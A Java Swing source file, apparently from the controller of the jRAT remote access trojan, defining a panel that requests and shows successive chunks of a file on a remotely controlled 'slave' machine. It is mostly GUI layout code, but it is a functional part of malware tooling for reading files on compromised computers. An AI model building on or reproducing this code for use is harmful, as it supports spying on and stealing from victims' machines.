package jrat.module.fs.ui.previews;

import jrat.api.Resources;
import jrat.controller.Slave;
import jrat.module.fs.packets.Packet60PreviewFile;

import javax.swing.*;
import javax.swing.GroupLayout.Alignment;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.border.EmptyBorder;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;


@SuppressWarnings("serial")
public class PanelPreviewFile extends PreviewPanel<String> {

    /**
     * current line in file we're looking at
     */
    private int line = 0;

    private String file;
	private JTextPane textPane;
	private JButton btnClearreset;

    /**
     * Component for displaying partial text content of a remote file
     * @param s slave
     * @param f remote file
     */
	public PanelPreviewFile(Slave s, String f) {
		super(s, "PreviewPanel file - " + f, Resources.getIcon("file"));

		this.file = f;

		setBorder(new EmptyBorder(5, 5, 5, 5));

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

		JButton btnReadMore = new JButton("Read more");
		btnReadMore.setIcon(Resources.getIcon("transfer"));
		btnReadMore.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				slave.addToSendQueue(new Packet60PreviewFile(file, line++));
			}
		});

		btnClearreset = new JButton("Clear/Reset");
		btnClearreset.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				textPane.setText("");
				line = 0;
			}
		});
		btnClearreset.setIcon(Resources.getIcon("clear"));
		GroupLayout gl_contentPane = new GroupLayout(this);
		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 516, Short.MAX_VALUE).addGroup(gl_contentPane.createSequentialGroup().addComponent(btnReadMore).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnClearreset))).addGap(1)));
		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 336, Short.MAX_VALUE).addPreferredGap(ComponentPlacement.RELATED).addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE).addComponent(btnReadMore).addComponent(btnClearreset)).addGap(4)));

		textPane = new JTextPane();
		scrollPane.setViewportView(textPane);
		setLayout(gl_contentPane);
	}

    /**
     * Appends text contents of a remote file to the text area
     */
	public void addData(String data) {
        try {
            textPane.getDocument().insertString(textPane.getDocument().getLength(), data + "\n", null);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
